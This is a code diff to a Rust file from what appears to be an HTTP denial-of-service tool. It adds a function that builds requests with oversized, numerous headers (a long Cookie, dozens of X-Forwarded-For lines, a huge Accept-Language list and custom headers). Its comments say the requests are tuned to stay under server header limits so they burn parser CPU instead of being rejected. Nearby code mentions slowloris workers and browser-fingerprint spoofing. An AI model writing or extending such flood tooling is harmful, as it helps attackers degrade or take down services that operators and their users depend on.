@@ -335,6 +335,54 @@ pub fn build_get_templates(host: &str, path: &str) -> Arc<[Box<[u8]>]> {
     templates.into()
 }
 
+/// Pre-build a GET whose *headers* are pathologically large and numerous: a big
+/// Cookie, many duplicate X-Forwarded-For, an exploded Accept-Language, and a
+/// wall of custom headers. Cheap for us to send, but the server must parse (and
+/// often allocate/validate) a large header set per request — parser-CPU pressure,
+/// a different axis than body or connection floods. Kept a few KB, under common
+/// ~8-16KB header limits, so mainstream servers parse it rather than fast-reject.
+pub fn build_header_flood_templates(host: &str, path: &str) -> Arc<[Box<[u8]>]> {
+    let mut cookie = String::from("Cookie: ");
+    for i in 0..48 {
+        if i > 0 {
+            cookie.push_str("; ");
+        }
+        cookie.push_str(&format!("s{i}=abcdefghijklmnopqrstuvwxyz0123{i}"));
+    }
+    cookie.push_str("\r\n");
+
+    let mut xff = String::new();
+    for i in 0..32u32 {
+        xff.push_str(&format!("X-Forwarded-For: 10.{}.{}.{}\r\n", i % 256, (i * 7) % 256, (i * 13) % 256));
+    }
+
+    let mut lang = String::from("Accept-Language: ");
+    for i in 0..40 {
+        if i > 0 {
+            lang.push_str(", ");
+        }
+        lang.push_str(&format!("l{i};q=0.{:02}", 99 - i));
+    }
+    lang.push_str("\r\n");
+
+    let mut custom = String::new();
+    for i in 0..32 {
+        custom.push_str(&format!("X-Meta-{i}: v{i}aaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n"));
+    }
+
+    let (ua, accept) = FINGERPRINTS[0];
+    let req = format!(
+        "GET {path} HTTP/1.1\r\n\
+         Host: {host}\r\n\
+         User-Agent: {ua}\r\n\
+         Accept: {accept}\r\n\
+         {lang}{cookie}{xff}{custom}\
+         Connection: keep-alive\r\n\r\n"
+    );
+    let templates: Vec<Box<[u8]>> = vec![req.into_bytes().into_boxed_slice()];
+    templates.into()
+}
+
 /// Pre-build the partial (deliberately unterminated) request head slowloris
 /// workers send once per connection. Note the absence of the final blank line.
 pub fn build_slowloris_head(host: &str, path: &str) -> Arc<[u8]> {
